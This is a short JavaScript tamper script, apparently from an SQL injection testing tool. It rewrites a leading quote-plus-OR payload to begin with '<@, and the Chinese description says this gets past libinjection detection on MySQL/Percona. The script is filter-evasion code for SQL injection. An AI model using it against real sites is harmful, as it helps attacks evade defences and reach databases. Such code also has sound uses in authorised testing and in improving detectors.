//@name: 引号转<@
//@usage: payload
//@enable: false
//@description: 前导单引号+OR→'<@ OR（libinjection不建模<@序列，MySQL/Percona）
function tamper(payload){ return payload ? payload.replace(/^'\s*(?=(?:OR|\|\|)\b)/i, "'<@ ") : payload; }